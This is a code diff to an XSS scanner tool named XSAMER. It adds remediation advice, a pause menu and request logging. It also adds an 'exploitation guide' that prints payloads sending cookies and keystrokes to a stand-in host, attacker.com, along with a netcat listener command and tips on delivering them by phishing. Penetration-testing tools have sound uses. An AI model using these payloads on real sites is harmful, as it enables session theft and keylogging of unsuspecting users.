@@ -10,6 +10,9 @@ import threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse, parse_qs
 import signal
+import select
+import tty
+import termios
 
 def show_banner():
     """Display XSAMER banner"""
@@ -28,6 +31,7 @@ class XSSTester:
     def __init__(self):
         self.payloads_file = "xss_payloads.json"
         self.results_file = "xsamer_result.txt"
+        self.all_requests_file = "all_requests.txt"  # New file for all requests
         self.progress_file = "xsamer_progress.json"
         self.payloads_dir = "payloads"
         self.urls_file = "urls.txt"
@@ -36,6 +40,7 @@ class XSSTester:
         self.pause_event = threading.Event()
         self.scanning = False
         self.vulnerable_results = []
+        self.all_requests = []  # Store all requests for saving
         self.status_filter = None
         self.load_payloads()
         
@@ -100,6 +105,98 @@ class XSSTester:
             
             except Exception as e:
                 print(f"[-] Error loading {file_path}: {e}")
+    
+    def get_remediation_advice(self, reflection_points, payload, context):
+        """Provide remediation advice based on the vulnerability context"""
+        advice = []
+        
+        if "raw" in reflection_points:
+            advice.append("🚨 CRITICAL: Input reflected without any encoding")
+            advice.append("💡 Fix: Implement proper output encoding (HTML Entity Encoding)")
+            advice.append("   Example: Convert < to &lt;, > to &gt;, etc.")
+        
+        if "html_encoded" in reflection_points:
+            advice.append("⚠️  WARNING: Input is HTML encoded but might be vulnerable in other contexts")
+            advice.append("💡 Fix: Use context-aware encoding (HTML, JavaScript, CSS, URL)")
+        
+        if "in_quotes" in reflection_points:
+            advice.append("🚨 CRITICAL: Input reflected inside HTML attributes")
+            advice.append("💡 Fix: Always encode for HTML attributes")
+            advice.append("   Example: Use &#x27; for single quotes, &quot; for double quotes")
+        
+        if "in_text" in reflection_points:
+            advice.append("⚠️  WARNING: Input reflected in text content")
+            advice.append("💡 Fix: Use HTML entity encoding for text nodes")
+        
+        # Context-specific advice
+        if "javascript:" in payload.lower():
+            advice.append("🔧 Specific Fix: Block or sanitize 'javascript:' protocol in URLs")
+            advice.append("   Use: URL validation and whitelist allowed protocols")
+        
+        if "<script>" in payload.lower():
+            advice.append("🔧 Specific Fix: Implement Content Security Policy (CSP)")
+            advice.append("   Header: Content-Security-Policy: script-src 'self'")
+        
+        if "onerror" in payload.lower() or "onload" in payload.lower():
+            advice.append("🔧 Specific Fix: Sanitize HTML attributes")
+            advice.append("   Use: HTML sanitizer library or allow-list safe attributes")
+        
+        # General remediation
+        advice.append("🛡️  General Prevention:")
+        advice.append("   1. Input Validation: Whitelist allowed characters")
+        advice.append("   2. Output Encoding: Context-aware encoding")
+        advice.append("   3. Content Security Policy (CSP)")
+        advice.append("   4. HTTPOnly cookies")
+        advice.append("   5. Use modern frameworks with built-in XSS protection")
+        
+        return advice
+    
+    def get_exploitation_guide(self, payload, reflection_points, test_url):
+        """Provide exploitation guidance"""
+        guide = []
+        
+        guide.append("🎯 EXPLOITATION GUIDE:")
+        
+        # Basic exploitation
+        guide.append("1. Basic Alert Confirmation:")
+        guide.append(f"   📋 Copy this URL: {test_url}")
+        guide.append("   🌐 Paste in browser to see if alert pops up")
+        
+        # Advanced exploitation based on payload type
+        if "<script>" in payload:
+            guide.append("2. Steal Cookies:")
+            guide.append("   📋 Use: <script>fetch('http://attacker.com/?c='+document.cookie)</script>")
+            guide.append("   💡 Set up listener: nc -lvnp 80")
+        
+        if "onerror" in payload or "onload" in payload:
+            guide.append("2. Event Handler Exploitation:")
+            guide.append("   📋 Use: <img src=x onerror=\"alert(document.cookie)\">")
+            guide.append("   🔧 Modify onerror to execute any JavaScript")
+        
+        if "javascript:" in payload:
+            guide.append("2. URL-Based Exploitation:")
+            guide.append("   📋 Use in: <a href=\"javascript:alert(document.domain)\">Click</a>")
+            guide.append("   🔗 Works in href, src, action attributes")
+        
+        # DOM-based guidance
+        if payload.startswith("#"):
+            guide.append("2. DOM-Based Exploitation:")
+            guide.append("   📋 Fragment payload: #<img src=x onerror=alert(1)>")
+            guide.append("   🌐 Works without server-side reflection")
+        
+        # Real-world attack scenarios
+        guide.append("3. Real-World Attack Scenarios:")
+        guide.append("   📧 Phishing: Embed in emails with malicious links")
+        guide.append("   🌍 Social Engineering: Trick users into clicking")
+        guide.append("   📱 Stored XSS: If persistent, affects all users")
+        guide.append("   🔗 Reflected XSS: Requires user interaction")
+        
+        guide.append("4. Advanced Payloads:")
+        guide.append("   📋 Keylogger: <script>document.onkeypress=function(e){fetch('http://attacker.com/?k='+e.key)}</script>")
+        guide.append("   📋 Redirect: <script>window.location='http://attacker.com'</script>")
+        guide.append("   📋 Form Stealer: Capture form submissions")
+        
+        return guide
     
     def get_all_payloads(self):
         """Get ALL payloads from ALL .txt files"""
@@ -206,7 +303,7 @@ class XSSTester:
         return None
     
     def save_vulnerable_results(self):
-        """Save ONLY vulnerable results to file"""
+        """Save ONLY vulnerable results to file with remediation"""
         if not self.vulnerable_results:
             print("[-] No vulnerable results to save")
             return
@@ -228,6 +325,27 @@ class XSSTester:
                     f.write(f"Parameter: {vuln['parameter']}\n")
                     f.write(f"Reflection Points: {', '.join(vuln['reflection_points'])}\n")
                     f.write(f"Status Code: {vuln['status_code']}\n")
+                    
+                    # Add remediation
+                    remediation = self.get_remediation_advice(
+                        vuln['reflection_points'], 
+                        vuln['payload'],
+                        vuln['parameter']
+                    )
+                    f.write(f"\n🛡️ REMEDIATION:\n")
+                    for line in remediation:
+                        f.write(f"   {line}\n")
+                    
+                    # Add exploitation guide
+                    exploitation = self.get_exploitation_guide(
+                        vuln['payload'],
+                        vuln['reflection_points'],
+                        vuln['test_url']
+                    )
+                    f.write(f"\n🎯 EXPLOITATION GUIDE:\n")
+                    for line in exploitation:
+                        f.write(f"   {line}\n")
+                    
                     f.write("-" * 80 + "\n\n")
             
             print(f"[+] Vulnerable results saved to: {self.results_file}")
@@ -235,6 +353,40 @@ class XSSTester:
             
         except Exception as e:
             print(f"[-] Error saving results: {e}")
+    
+    def save_all_requests(self):
+        """Save ALL requests to file"""
+        if not self.all_requests:
+            print("[-] No requests to save")
+            return
+        
+        try:
+            with open(self.all_requests_file, 'w', encoding='utf-8') as f:
+                f.write("=" * 80 + "\n")
+                f.write("XSAMER - ALL SCAN REQUESTS\n")
+                f.write("=" * 80 + "\n")
+                f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write(f"Total Requests: {len(self.all_requests)}\n")
+                f.write("=" * 80 + "\n\n")
+                
+                for i, request in enumerate(self.all_requests, 1):
+                    if not request.get('error'):
+                        f.write(f"REQUEST #{i}\n")
+                        f.write(f"URL: {request['test_url']}\n")
+                        f.write(f"Payload: {request['payload']}\n")
+                        f.write(f"Method: {request['method']}\n")
+                        f.write(f"Parameter: {request['parameter']}\n")
+                        f.write(f"Status Code: {request['status_code']}\n")
+                        f.write(f"Reflected: {'Yes' if request.get('reflected') else 'No'}\n")
+                        if request.get('reflected'):
+                            f.write(f"Reflection Points: {', '.join(request['reflection_points'])}\n")
+                        f.write("-" * 80 + "\n\n")
+            
+            print(f"[+] All requests saved to: {self.all_requests_file}")
+            print(f"[+] Total requests recorded: {len(self.all_requests)}")
+            
+        except Exception as e:
+            print(f"[-] Error saving all requests: {e}")
     
     def get_status_color(self, status_code):
         """Get color for status code"""
@@ -333,6 +485,34 @@ class XSSTester:
         
         return reflection_points
     
+    def show_pause_menu(self, completed_tests, total_tests, vulnerabilities_found):
+        """Show interactive pause menu"""
+        print(f"\n\n⏸️  SCAN PAUSED")
+        print("=" * 40)
+        print(f"📊 Progress: {completed_tests}/{total_tests}")
+        print(f"📦 Payloads left: {total_tests - completed_tests}")
+        print(f"🚨 Vulnerabilities found: {vulnerabilities_found}")
+        print("=" * 40)
+        print("Options:")
+        print("  [C] Continue scanning")
+        print("  [S] Save all requests and exit")
+        print("  [Q] Quit without saving")
+        print("=" * 40)
+        
+        # Get user input without requiring Enter
+        old_settings = termios.tcgetattr(sys.stdin)
+        try:
+            tty.setraw(sys.stdin.fileno())
+            i, o, e = select.select([sys.stdin], [], [], 300)  # 5 minute timeout
+            if i:
+                choice = sys.stdin.read(1).lower()
+            else:
+                choice = 'c'  # Auto-continue after timeout
+        finally:
+            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
+        
+        return choice
+    
     def scan_website(self, target_url, methods=None, parameters=None, resume=False):
         """Perform comprehensive XSS scanning with ALL payloads"""
         # Always use ALL payloads from ALL .txt files
@@ -413,6 +593,12 @@ class XSSTester:
         progress_thread.daemon = True
         progress_thread.start()
         
+        # Signal handler for graceful pause
+        def signal_handler(sig, frame):
+            self.pause_event.set()
+        
+        original_signal = signal.signal(signal.SIGINT, signal_handler)
+        
         try:
             with ThreadPoolExecutor(max_workers=self.threads) as executor:
                 # Submit all tests
@@ -420,7 +606,25 @@ class XSSTester:
                 
                 for future in as_completed(future_to_test):
                     if self.pause_event.is_set():
-                        break
+                        # Show pause menu
+                        choice = self.show_pause_menu(completed_tests, total_tests, vulnerabilities_found)
+                        
+                        if choice == 'c':
+                            print("\n[+] Resuming scan...")
+                            self.pause_event.clear()
+                            continue
+                        elif choice == 's':
+                            print("\n[+] Saving all requests and exiting...")
+                            self.save_all_requests()
+                            self.save_vulnerable_results()
+                            return vulnerabilities_found, True
+                        elif choice == 'q':
+                            print("\n[+] Exiting without saving...")
+                            return vulnerabilities_found, True
+                        else:
+                            print(f"\n[+] Unknown option '{choice}', resuming...")
+                            self.pause_event.clear()
+                            continue
                         
                     test = future_to_test[future]
                     payload, method, param = test
@@ -428,8 +632,13 @@ class XSSTester:
                     
                     try:
                         result = future.result()
-                        if result and not result.get('error'):
-                            status_code = result['status_code']
+                        if result:
+                            # Store all requests
+                            self.all_requests.append(result)
+                            
+                            # Update statistics
+                            if not result.get('error'):
+                                status_code = result['status_code']
                             
                             # Check if we should show this result based on filter
                             should_show = False
@@ -448,7 +657,7 @@ class XSSTester:
                                 status_color = self.get_status_color(status_code)
                                 payloads_left = total_tests - completed_tests
                                 
-                                print(f"📡 {show_reason} PAYLOAD")
+                                print(f"📡 {show_reason} PAYLOAD #{vulnerabilities_found + 1}")
                                 print(f"   📍 Status: {status_color} {status_code}")
                                 print(f"   🔧 Parameter: {param}")
                                 print(f"   📦 Payload: {result['payload']}")
@@ -457,8 +666,26 @@ class XSSTester:
                                     print(f"   🔄 Reflection: {', '.join(result['reflection_points'])}")
                                     vulnerabilities_found += 1
                                     self.vulnerable_results.append(result)
+                                    
+                                    # Show immediate remediation and exploitation tips
+                                    remediation = self.get_remediation_advice(
+                                        result['reflection_points'], 
+                                        result['payload'],
+                                        param
+                                    )
+                                    print(f"   🛡️  Remediation:")
+                                    for i, advice in enumerate(remediation[:3]):  # Show first 3 tips
+                                        print(f"      {advice}")
+                                    
+                                    exploitation = self.get_exploitation_guide(
+                                        result['payload'],
+                                        result['reflection_points'],
+                                        result['test_url']
+                                    )
+                                    print(f"   🎯 Quick Test:")
+                                    print(f"      📋 Copy URL: {result['test_url']}")
+                                    print(f"      🌐 Paste in browser to confirm alert")
                                 
-                                print(f"   🌐 URL: {result['test_url']}")
                                 print(f"   📊 Payloads left: {payloads_left}")
                                 print("   " + "-" * 50)
                     
@@ -480,17 +707,23 @@ class XSSTester:
                         print(f"\r[*] Progress: {completed_tests}/{total_tests} ({progress_percent:.1f}%) | Payloads left: {payloads_left}{filter_info}", end="", flush=True)
             
         except KeyboardInterrupt:
-            payloads_left = total_tests - completed_tests
-            print(f"\n\n⏸️  Scan paused!")
-            print(f"📊 Completed: {completed_tests}/{total_tests}")
-            print(f"📦 Payloads left: {payloads_left}")
-            if self.status_filter is None:
-                print(f"🚨 Reflected payloads: {vulnerabilities_found}")
+            # This should not happen with our signal handler, but just in case
+            choice = self.show_pause_menu(completed_tests, total_tests, vulnerabilities_found)
+            if choice == 's':
+                print("\n[+] Saving all requests and exiting...")
+                self.save_all_requests()
+                self.save_vulnerable_results()
+                return vulnerabilities_found, True
+            elif choice == 'q':
+                print("\n[+] Exiting without saving...")
+                return vulnerabilities_found, True
             else:
-                print(f"📡 Status {self.status_filter} payloads shown")
-            print("💡 Use 'xsamer --resume' to continue")
-            self.pause_event.set()
-            return vulnerabilities_found, True
+                print("\n[+] Resuming scan...")
+                self.pause_event.clear()
+        
+        finally:
+            # Restore original signal handler
+            signal.signal(signal.SIGINT, original_signal)
         
         self.scanning = False
         
@@ -530,11 +763,6 @@ class XSSTester:
         print("\n💡 All payloads will be tested during scanning")
 
 
-def signal_handler(sig, frame):
-    """Handle Ctrl+C for graceful pause"""
-    print("\n\n⏸️  Pause signal received...")
-
-
 def main():
     # Show banner when no arguments provided
     if len(sys.argv) == 1:
@@ -551,12 +779,9 @@ def main():
         print("  xsamer -u https://example.com -t 20  # Fast scan with 20 threads")
         print("  xsamer --resume                      # Resume paused scan")
         print("  xsamer --show                        # Show payload files")
-        print("\n💡 Default: Shows only REFLECTED payloads")
-        print("💡 Use --r200, --r300, --r400, --r500 to filter by status code")
+        print("\n💡 Ctrl+C: Pause with interactive menu")
+        print("💡 Options: [C]ontinue, [S]ave all, [Q]uit")
         return
-
-    # Set up signal handler for pause
-    signal.signal(signal.SIGINT, signal_handler)
 
     parser = argparse.ArgumentParser(description='🚀 XSAMER - Advanced XSS Scanner Tool', 
                                    usage='xsamer [OPTIONS]')
@@ -566,7 +791,7 @@ def main():
     parser.add_argument('-l', '--list', dest='urls_file', help='File containing list of URLs to scan')
     parser.add_argument('--resume', action='store_true', help='Resume paused scan')
     
-    # Status code filters (fixed with proper argument names)
+    # Status code filters
     parser.add_argument('--r200', action='store_true', help='Show only 200 status codes')
     parser.add_argument('--r300', action='store_true', help='Show only 300 status codes')
     parser.add_argument('--r400', action='store_true', help='Show only 400 status codes')
@@ -588,7 +813,7 @@ def main():
     scanner.verbose = args.verbose
     scanner.threads = args.threads
     
-    # Set status code filter (fixed argument access)
+    # Set status code filter
     if args.r200:
         scanner.status_filter = 200
     elif args.r300:
